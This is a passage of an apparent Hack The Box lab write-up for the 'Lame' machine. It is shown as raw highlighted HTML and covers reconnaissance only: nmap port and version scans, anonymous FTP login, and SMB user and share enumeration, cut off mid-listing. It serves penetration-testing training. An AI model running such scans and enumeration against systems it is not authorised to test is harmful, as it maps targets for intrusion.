</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ mkdir 1_recon<span class=p>;</span> mkdir 2_exploitation<span class=p>;</span> mkdir 3_post-exploitation
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-dedivip-2<span class=o>]</span>─<span class=o>[</span>10.10.14.2<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-elmlfwe0dg<span class=o>]</span>─<span class=o>[</span>~/lame<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ tree
</span></span><span class=line><span class=cl>.
</span></span><span class=line><span class=cl>├── 1_recon
</span></span><span class=line><span class=cl>├── 2_exploitation
</span></span><span class=line><span class=cl>└── 3_post-exploitation
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=m>3</span> directories, <span class=m>0</span> files
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-dedivip-2<span class=o>]</span>─<span class=o>[</span>10.10.14.2<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-elmlfwe0dg<span class=o>]</span>─<span class=o>[</span>~/lame<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$
</span></span></code></pre></div><p>Once that&rsquo;s done, we follow up with a quick <strong>connection check</strong>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>eu-dedivip-2<span class=o>]</span>─<span class=o>[</span>10.10.14.2<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-elmlfwe0dg<span class=o>]</span>─<span class=o>[</span>~/lame<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ <span class=nb>cd</span> 1_recon/
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-dedivip-2<span class=o>]</span>─<span class=o>[</span>10.10.14.2<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-elmlfwe0dg<span class=o>]</span>─<span class=o>[</span>~/lame/1_recon<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ ping -c <span class=m>4</span> -n -R <span class=nv>$rhost</span> &gt; connection-test.txt
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-dedivip-2<span class=o>]</span>─<span class=o>[</span>10.10.14.2<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-elmlfwe0dg<span class=o>]</span>─<span class=o>[</span>~/lame/1_recon<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ cat connection-test.txt 
</span></span><span class=line><span class=cl>PING 10.129.179.224 <span class=o>(</span>10.129.179.224<span class=o>)</span> 56<span class=o>(</span>124<span class=o>)</span> bytes of data.
</span></span><span class=line><span class=cl><span class=m>64</span> bytes from 10.129.179.224: <span class=nv>icmp_seq</span><span class=o>=</span><span class=m>1</span> <span class=nv>ttl</span><span class=o>=</span><span class=m>63</span> <span class=nv>time</span><span class=o>=</span>16.5 ms
</span></span><span class=line><span class=cl>RR: 	10.10.14.2
</span></span><span class=line><span class=cl>	10.129.0.1
</span></span><span class=line><span class=cl>	10.129.179.224
</span></span><span class=line><span class=cl>	10.129.179.224
</span></span><span class=line><span class=cl>	10.10.14.1
</span></span><span class=line><span class=cl>	10.10.14.2
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=m>64</span> bytes from 10.129.179.224: <span class=nv>icmp_seq</span><span class=o>=</span><span class=m>2</span> <span class=nv>ttl</span><span class=o>=</span><span class=m>63</span> <span class=nv>time</span><span class=o>=</span>11.4 ms	<span class=o>(</span>same route<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=m>64</span> bytes from 10.129.179.224: <span class=nv>icmp_seq</span><span class=o>=</span><span class=m>3</span> <span class=nv>ttl</span><span class=o>=</span><span class=m>63</span> <span class=nv>time</span><span class=o>=</span>11.1 ms	<span class=o>(</span>same route<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=m>64</span> bytes from 10.129.179.224: <span class=nv>icmp_seq</span><span class=o>=</span><span class=m>4</span> <span class=nv>ttl</span><span class=o>=</span><span class=m>63</span> <span class=nv>time</span><span class=o>=</span>10.9 ms	<span class=o>(</span>same route<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>--- 10.129.179.224 ping statistics ---
</span></span><span class=line><span class=cl><span class=m>4</span> packets transmitted, <span class=m>4</span> received, 0% packet loss, <span class=nb>time</span> 3005ms
</span></span><span class=line><span class=cl>rtt min/avg/max/mdev <span class=o>=</span> 10.946/12.480/16.489/2.320 ms
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-dedivip-2<span class=o>]</span>─<span class=o>[</span>10.10.14.2<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-elmlfwe0dg<span class=o>]</span>─<span class=o>[</span>~/lame/1_recon<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$
</span></span></code></pre></div><p>Since our <strong>target</strong> is already up and running, it&rsquo;s time for a nice <strong>tcp</strong> SYN and all-ports <strong>scan</strong>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>eu-dedivip-2<span class=o>]</span>─<span class=o>[</span>10.10.14.2<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-elmlfwe0dg<span class=o>]</span>─<span class=o>[</span>~/lame/1_recon<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ nmap -Pn -sT -p- -min-rate <span class=m>5000</span> -oN nmap-syn-allports-scan <span class=nv>$rhost</span>
</span></span><span class=line><span class=cl>Starting Nmap 7.93 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2023-05-26 00:55 BST
</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.129.179.224
</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.019s latency<span class=o>)</span>.
</span></span><span class=line><span class=cl>Not shown: <span class=m>65531</span> filtered tcp ports <span class=o>(</span>no-response<span class=o>)</span>
</span></span><span class=line><span class=cl>PORT    STATE SERVICE
</span></span><span class=line><span class=cl>21/tcp  open  ftp
</span></span><span class=line><span class=cl>22/tcp  open  ssh
</span></span><span class=line><span class=cl>139/tcp open  netbios-ssn
</span></span><span class=line><span class=cl>445/tcp open  microsoft-ds
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 26.44 seconds
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-dedivip-2<span class=o>]</span>─<span class=o>[</span>10.10.14.2<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-elmlfwe0dg<span class=o>]</span>─<span class=o>[</span>~/lame/1_recon<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$
</span></span></code></pre></div><p><strong>Four</strong> ports are reported to be <strong>open</strong>. We use the <strong>default scripts</strong> and some <strong>version scanning</strong> to get more detailed <strong>information</strong> about them.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>eu-dedivip-2<span class=o>]</span>─<span class=o>[</span>10.10.14.2<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-elmlfwe0dg<span class=o>]</span>─<span class=o>[</span>~/lame/1_recon<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ nmap -Pn -sT -sC -sV -p 21,22,139,445 -oN nmap-syn-version-script-scan <span class=nv>$rhost</span> 
</span></span><span class=line><span class=cl>Starting Nmap 7.93 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2023-05-26 00:57 BST
</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.129.179.224
</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.012s latency<span class=o>)</span>.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>PORT    STATE SERVICE     VERSION
</span></span><span class=line><span class=cl>21/tcp  open  ftp         vsftpd 2.3.4
</span></span><span class=line><span class=cl><span class=p>|</span>_ftp-anon: Anonymous FTP login allowed <span class=o>(</span>FTP code 230<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span> ftp-syst: 
</span></span><span class=line><span class=cl><span class=p>|</span>   STAT: 
</span></span><span class=line><span class=cl><span class=p>|</span> FTP server status:
</span></span><span class=line><span class=cl><span class=p>|</span>      Connected to 10.10.14.2
</span></span><span class=line><span class=cl><span class=p>|</span>      Logged in as ftp
</span></span><span class=line><span class=cl><span class=p>|</span>      TYPE: ASCII
</span></span><span class=line><span class=cl><span class=p>|</span>      No session bandwidth limit
</span></span><span class=line><span class=cl><span class=p>|</span>      Session timeout in seconds is <span class=m>300</span>
</span></span><span class=line><span class=cl><span class=p>|</span>      Control connection is plain text
</span></span><span class=line><span class=cl><span class=p>|</span>      Data connections will be plain text
</span></span><span class=line><span class=cl><span class=p>|</span>      vsFTPd 2.3.4 - secure, fast, stable
</span></span><span class=line><span class=cl><span class=p>|</span>_End of status
</span></span><span class=line><span class=cl>22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 <span class=o>(</span>protocol 2.0<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span> ssh-hostkey: 
</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>1024</span> 600fcfe1c05f6a74d69024fac4d56ccd <span class=o>(</span>DSA<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_  <span class=m>2048</span> 5656240f211ddea72bae61b1243de8f3 <span class=o>(</span>RSA<span class=o>)</span>
</span></span><span class=line><span class=cl>139/tcp open  netbios-ssn Samba smbd 3.X - 4.X <span class=o>(</span>workgroup: WORKGROUP<span class=o>)</span>
</span></span><span class=line><span class=cl>445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian <span class=o>(</span>workgroup: WORKGROUP<span class=o>)</span>
</span></span><span class=line><span class=cl>Service Info: OSs: Unix, Linux<span class=p>;</span> CPE: cpe:/o:linux:linux_kernel
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Host script results:
</span></span><span class=line><span class=cl><span class=p>|</span>_clock-skew: mean: 2h00m06s, deviation: 2h49m45s, median: 4s
</span></span><span class=line><span class=cl><span class=p>|</span> smb-os-discovery: 
</span></span><span class=line><span class=cl><span class=p>|</span>   OS: Unix <span class=o>(</span>Samba 3.0.20-Debian<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>   Computer name: lame
</span></span><span class=line><span class=cl><span class=p>|</span>   NetBIOS computer name: 
</span></span><span class=line><span class=cl><span class=p>|</span>   Domain name: hackthebox.gr
</span></span><span class=line><span class=cl><span class=p>|</span>   FQDN: lame.hackthebox.gr
</span></span><span class=line><span class=cl><span class=p>|</span>_  System time: 2023-05-25T19:58:07-04:00
</span></span><span class=line><span class=cl><span class=p>|</span>_smb2-time: Protocol negotiation failed <span class=o>(</span>SMB2<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span> smb-security-mode: 
</span></span><span class=line><span class=cl><span class=p>|</span>   account_used: &lt;blank&gt;
</span></span><span class=line><span class=cl><span class=p>|</span>   authentication_level: user
</span></span><span class=line><span class=cl><span class=p>|</span>   challenge_response: supported
</span></span><span class=line><span class=cl><span class=p>|</span>_  message_signing: disabled <span class=o>(</span>dangerous, but default<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 52.07 seconds
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-dedivip-2<span class=o>]</span>─<span class=o>[</span>10.10.14.2<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-elmlfwe0dg<span class=o>]</span>─<span class=o>[</span>~/lame/1_recon<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$
</span></span></code></pre></div><p>Some of the <strong>interesting</strong> bits we might take away from this <strong>report</strong>:</p><ul><li><em><strong>ftp</strong></em> <strong>anonymous login</strong> is allowed on port 21 - version vsFTPd 2.3.4</li><li>ssh version &ndash;> OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)</li><li>potential <strong>smb</strong> shares | 139 &ndash;> older, on top of <em><strong>netbios</strong></em> (same network only!!)</li><li>potential <strong>smb</strong> shares | 445 &ndash;> newer, on top of <em><strong>tcp</strong></em></li><li>os: probably Ubuntu 8.04.4 LTS (Hardy Heron)</li></ul><p>Since <strong>guest login</strong> appears to be enabled, <strong>enumerating</strong> <em><strong>ftp</strong></em> looks like a perfect place to start.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>eu-dedivip-2<span class=o>]</span>─<span class=o>[</span>10.10.14.2<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-elmlfwe0dg<span class=o>]</span>─<span class=o>[</span>~/lame/1_recon<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ ftp <span class=nv>$rhost</span> 
</span></span><span class=line><span class=cl>Connected to 10.129.179.224.
</span></span><span class=line><span class=cl><span class=m>220</span> <span class=o>(</span>vsFTPd 2.3.4<span class=o>)</span>
</span></span><span class=line><span class=cl>Name <span class=o>(</span>10.129.179.224:root<span class=o>)</span>: anonymous
</span></span><span class=line><span class=cl><span class=m>331</span> Please specify the password.
</span></span><span class=line><span class=cl>Password:
</span></span><span class=line><span class=cl><span class=m>230</span> Login successful.
</span></span><span class=line><span class=cl>Remote system <span class=nb>type</span> is UNIX.
</span></span><span class=line><span class=cl>Using binary mode to transfer files.
</span></span><span class=line><span class=cl>ftp&gt; ls
</span></span><span class=line><span class=cl><span class=m>200</span> PORT <span class=nb>command</span> successful. Consider using PASV.
</span></span><span class=line><span class=cl><span class=m>150</span> Here comes the directory listing.
</span></span><span class=line><span class=cl><span class=m>226</span> Directory send OK.
</span></span><span class=line><span class=cl>ftp&gt; <span class=nb>exit</span>
</span></span><span class=line><span class=cl><span class=m>221</span> Goodbye.
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-dedivip-2<span class=o>]</span>─<span class=o>[</span>10.10.14.2<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-elmlfwe0dg<span class=o>]</span>─<span class=o>[</span>~/lame/1_recon<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ 
</span></span></code></pre></div><p>Sadly, it looks like the share is <strong>empty</strong>. Since <strong>ftp</strong> was a bust, we continue our <strong>recon</strong> by <strong>enumerating</strong> (quite extensively) the <em><strong>samba</strong></em> shares.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>eu-dedivip-2<span class=o>]</span>─<span class=o>[</span>10.10.14.2<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-elmlfwe0dg<span class=o>]</span>─<span class=o>[</span>~/lame/1_recon/assets-found<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ nmap -Pn --script smb-enum-domains.nse,smb-enum-groups.nse,smb-enum-processes.nse,smb-enum-services.nse,smb-enum-sessions.nse,smb-enum-shares.nse,smb-enum-users.nse -p445 <span class=nv>$rhost</span>
</span></span><span class=line><span class=cl>Starting Nmap 7.93 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2023-05-26 01:55 BST
</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.129.179.224
</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.013s latency<span class=o>)</span>.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>PORT    STATE SERVICE
</span></span><span class=line><span class=cl>445/tcp open  microsoft-ds
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Host script results:
</span></span><span class=line><span class=cl><span class=p>|</span> smb-enum-users: 
</span></span><span class=line><span class=cl><span class=p>|</span>   LAME<span class=se>\b</span>ackup <span class=o>(</span>RID: 1068<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>     Full name:   backup
</span></span><span class=line><span class=cl><span class=p>|</span>     Flags:       Account disabled, Normal user account
</span></span><span class=line><span class=cl><span class=p>|</span>   LAME<span class=se>\b</span>in <span class=o>(</span>RID: 1004<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>     Full name:   bin
</span></span><span class=line><span class=cl><span class=p>|</span>     Flags:       Account disabled, Normal user account
</span></span><span class=line><span class=cl><span class=p>|</span>   LAME<span class=se>\b</span>ind <span class=o>(</span>RID: 1210<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>     Flags:       Account disabled, Normal user account
</span></span><span class=line><span class=cl><span class=p>|</span>   LAME<span class=se>\d</span>aemon <span class=o>(</span>RID: 1002<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>     Full name:   daemon
</span></span><span class=line><span class=cl><span class=p>|</span>     Flags:       Account disabled, Normal user account
</span></span><span class=line><span class=cl><span class=p>|</span>   LAME<span class=se>\d</span>hcp <span class=o>(</span>RID: 1202<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>     Flags:       Account disabled, Normal user account
</span></span><span class=line><span class=cl><span class=p>|</span>   LAME<span class=se>\d</span>istccd <span class=o>(</span>RID: 1222<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>     Flags:       Account disabled, Normal user account
</span></span><span class=line><span class=cl><span class=p>|</span>   LAME<span class=se>\f</span>tp <span class=o>(</span>RID: 1214<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>     Flags:       Account disabled, Normal user account
</span></span><span class=line><span class=cl><span class=p>|</span>   LAME<span class=se>\g</span>ames <span class=o>(</span>RID: 1010<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>     Full name:   games
</span></span><span class=line><span class=cl><span class=p>|</span>     Flags:       Account disabled, Normal user account
</span></span><span class=line><span class=cl><span class=p>|</span>   LAME<span class=se>\g</span>nats <span class=o>(</span>RID: 1082<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>     Full name:   Gnats Bug-Reporting System <span class=o>(</span>admin<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>     Flags:       Account disabled, Normal user account
</span></span><span class=line><span class=cl><span class=p>|</span>   LAME<span class=se>\i</span>rc <span class=o>(</span>RID: 1078<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>     Full name:   ircd
</span></span><span class=line><span class=cl><span class=p>|</span>     Flags:       Account disabled, Normal user account
</span></span><span class=line><span class=cl><span class=p>|</span>   LAME<span class=se>\k</span>log <span class=o>(</span>RID: 1206<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>     Flags:       Account disabled, Normal user account
</span></span><span class=line><span class=cl><span class=p>|</span>   LAME<span class=se>\l</span>ibuuid <span class=o>(</span>RID: 1200<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>     Flags:       Account disabled, Normal user account
</span></span><span class=line><span class=cl><span class=p>|</span>   LAME<span class=se>\l</span>ist <span class=o>(</span>RID: 1076<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>     Full name:   Mailing List Manager
</span></span><span class=line><span class=cl><span class=p>|</span>     Flags:       Account disabled, Normal user account
</span></span><span class=line><span class=cl><span class=p>|</span>   LAME<span class=se>\l</span>p <span class=o>(</span>RID: 1014<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>     Full name:   lp
</span></span><span class=line><span class=cl><span class=p>|</span>     Flags:       Account disabled, Normal user account
</span></span><span class=line><span class=cl><span class=p>|</span>   LAME<span class=se>\m</span>ail <span class=o>(</span>RID: 1016<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>     Full name:   mail
</span></span><span class=line><span class=cl><span class=p>|</span>     Flags:       Account disabled, Normal user account
</span></span><span class=line><span class=cl><span class=p>|</span>   LAME<span class=se>\m</span>an <span class=o>(</span>RID: 1012<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>     Full name:   man
</span></span><span class=line><span class=cl><span class=p>|</span>     Flags:       Account disabled, Normal user account
</span></span><span class=line><span class=cl><span class=p>|</span>   LAME<span class=se>\m</span>sfadmin <span class=o>(</span>RID: 3000<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>     Full name:   msfadmin,,,
</span></span><span class=line><span class=cl><span class=p>|</span>     Flags:       Normal user account
</span></span><span class=line><span class=cl><span class=p>|</span>   LAME<span class=se>\m</span>ysql <span class=o>(</span>RID: 1218<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>     Full name:   MySQL Server,,,
</span></span><span class=line><span class=cl><span class=p>|</span>     Flags:       Account disabled, Normal user account
</span></span><span class=line><span class=cl><span class=p>|</span>   LAME<span class=se>\n</span>ews <span class=o>(</span>RID: 1018<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>     Full name:   news
</span></span><span class=line><span class=cl><span class=p>|</span>     Flags:       Account disabled, Normal user account
</span></span><span class=line><span class=cl><span class=p>|</span>   LAME<span class=se>\n</span>obody <span class=o>(</span>RID: 501<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>     Full name:   nobody
</span></span><span class=line><span class=cl><span class=p>|</span>     Flags:       Account disabled, Normal user account
</span></span><span class=line><span class=cl><span class=p>|</span>   LAME<span class=se>\p</span>ostfix <span class=o>(</span>RID: 1212<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>     Flags:       Account disabled, Normal user account
</span></span><span class=line><span class=cl><span class=p>|</span>   LAME<span class=se>\p</span>ostgres <span class=o>(</span>RID: 1216<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>     Full name:   PostgreSQL administrator,,,
</span></span><span class=line><span class=cl><span class=p>|</span>     Flags:       Account disabled, Normal user account
</span></span><span class=line><span class=cl><span class=p>|</span>   LAME<span class=se>\p</span>roftpd <span class=o>(</span>RID: 1226<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>     Flags:       Account disabled, Normal user account
</span></span><span class=line><span class=cl><span class=p>|</span>   LAME<span class=se>\p</span>roxy <span class=o>(</span>RID: 1026<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>     Full name:   proxy
</span></span><span class=line><span class=cl><span class=p>|</span>     Flags:       Account disabled, Normal user account
</span></span><span class=line><span class=cl><span class=p>|</span>   LAME<span class=se>\r</span>oot <span class=o>(</span>RID: 1000<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>     Full name:   root
</span></span><span class=line><span class=cl><span class=p>|</span>     Flags:       Account disabled, Normal user account
</span></span><span class=line><span class=cl><span class=p>|</span>   LAME<span class=se>\s</span>ervice <span class=o>(</span>RID: 3004<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>     Full name:   ,,,
</span></span><span class=line><span class=cl><span class=p>|</span>     Flags:       Account disabled, Normal user account
</span></span><span class=line><span class=cl><span class=p>|</span>   LAME<span class=se>\s</span>shd <span class=o>(</span>RID: 1208<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>     Flags:       Account disabled, Normal user account
</span></span><span class=line><span class=cl><span class=p>|</span>   LAME<span class=se>\s</span>ync <span class=o>(</span>RID: 1008<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>     Full name:   sync
</span></span><span class=line><span class=cl><span class=p>|</span>     Flags:       Account disabled, Normal user account
</span></span><span class=line><span class=cl><span class=p>|</span>   LAME<span class=se>\s</span>ys <span class=o>(</span>RID: 1006<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>     Full name:   sys
</span></span><span class=line><span class=cl><span class=p>|</span>     Flags:       Account disabled, Normal user account
</span></span><span class=line><span class=cl><span class=p>|</span>   LAME<span class=se>\s</span>yslog <span class=o>(</span>RID: 1204<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>     Flags:       Account disabled, Normal user account
</span></span><span class=line><span class=cl><span class=p>|</span>   LAME<span class=se>\t</span>elnetd <span class=o>(</span>RID: 1224<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>     Flags:       Account disabled, Normal user account
</span></span><span class=line><span class=cl><span class=p>|</span>   LAME<span class=se>\t</span>omcat55 <span class=o>(</span>RID: 1220<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>     Flags:       Account disabled, Normal user account
</span></span><span class=line><span class=cl><span class=p>|</span>   LAME<span class=se>\u</span>ser <span class=o>(</span>RID: 3002<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>     Full name:   just a user,111,,
</span></span><span class=line><span class=cl><span class=p>|</span>     Flags:       Normal user account
</span></span><span class=line><span class=cl><span class=p>|</span>   LAME<span class=se>\u</span>ucp <span class=o>(</span>RID: 1020<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>     Full name:   uucp
</span></span><span class=line><span class=cl><span class=p>|</span>     Flags:       Account disabled, Normal user account
</span></span><span class=line><span class=cl><span class=p>|</span>   LAME<span class=se>\w</span>ww-data <span class=o>(</span>RID: 1066<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>     Full name:   www-data
</span></span><span class=line><span class=cl><span class=p>|</span>_    Flags:       Account disabled, Normal user account
</span></span><span class=line><span class=cl><span class=p>|</span>_smb-enum-sessions: ERROR: Script execution failed <span class=o>(</span>use -d to debug<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span> smb-enum-shares: 
</span></span><span class=line><span class=cl><span class=p>|</span>   account_used: &lt;blank&gt;
</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=se>\\</span>10.129.179.224<span class=se>\A</span>DMIN$: 
</span></span><span class=line><span class=cl><span class=p>|</span>     Type: STYPE_IPC
</span></span><span class=line><span class=cl><span class=p>|</span>     Comment: IPC Service <span class=o>(</span>lame server <span class=o>(</span>Samba 3.0.20-Debian<span class=o>))</span>
</span></span><span class=line><span class=cl><span class=p>|</span>     Users: <span class=m>1</span>
</span></span><span class=line><span class=cl><span class=p>|</span>     Max Users: &lt;unlimited&gt;
</span></span><span class=line><span class=cl><span class=p>|</span>     Path: C:<span class=se>\t</span>mp
</span></span><span class=line><span class=cl><span class=p>|</span>     Anonymous access: &lt;none&gt;
</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=se>\\</span>10.129.179.224<span class=se>\I</span>PC$: 
</span></span><span class=line><span class=cl><span class=p>|</span>     Type: STYPE_IPC
</span></span><span class=line><span class=cl><span class=p>|</span>     Comment: IPC Service <span class=o>(</span>lame server <span class=o>(</span>Samba 3.0.20-Debian<span class=o>))</span>
</span></span><span class=line><span class=cl><span class=p>|</span>     Users: <span class=m>1</span>
</span></span><span class=line><span class=cl><span class=p>|</span>     Max Users: &lt;unlimited&gt;
</span></span><span class=line><span class=cl><span class=p>|</span>     Path: C:<span class=se>\t</span>mp
</span></span><span class=line><span class=cl><span class=p>|</span>     Anonymous access: READ/WRITE
</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=se>\\</span>10.129.179.224<span class=se>\o</span>pt: 
</span></span><span class=line><span class=cl><span class=p>|</span>     Type: STYPE_DISKTREE
</span></span><span class=line><span class=cl><span class=p>|</span>     Comment: 
</span></span><span class=line><span class=cl><span class=p>|</span>     Users: <span class=m>1</span>
</span></span><span class=line><span class=cl><span class=p>|</span>     Max Users: &lt;unlimited&gt;
</span></span><span class=line><span class=cl><span class=p>|</span>     Path: C:<span class=se>\t</span>mp
</span></span><span class=line><span class=cl><span class=p>|</span>     Anonymous access: &lt;none&gt;
</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=se>\\</span>10.129.179.224<span class=se>\p</span>rint$: 
</span></span><span class=line><span class=cl><span class=p>|</span>     Type: STYPE_DISKTREE
</span></span><span class=line><span class=cl><span class=p>|</span>     Comment: Printer Drivers
</span></span><span class=line><span class=cl><span class=p>|</span>     Users: <span class=m>1</span>
</span></span><span class=line><span class=cl><span class=p>|</span>     Max Users: &lt;unlimited&gt;
</span></span><span class=line><span class=cl><span class=p>|</span>     Path: C:<span class=se>\v</span>ar<span class=se>\l</span>ib<span class=se>\s</span>amba<span class=se>\p</span>rinters
</span></span><span class=line><span class=cl><span class=p>|</span>     Anonymous access: &lt;none&gt;
</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=se>\\</span>10.129.179.224<span class=se>\t</span>mp: 
</span></span><span class=line><span class=cl><span class=p>|</span>     Type: STYPE_DISKTREE
</span></span><span class=line><span class=cl><span class=p>|</span>     Comment: oh noes!
</span></span><span class=line><span class=cl><span class=p>|</span>     Users: <span class=m>1</span>
</span></span><span class=line><span class=cl><span class=p>|</span>     Max Users: &lt;unlimited&gt;
</span></span><span class=line><span class=cl><span class=p>|</span>     Path: C:<span class=se>\t</span>mp
</span></span><span class=line><span class=cl><span class=p>|</span>_    Anonymous access: READ/WRITE
</span></span><span class=line><span class=cl>
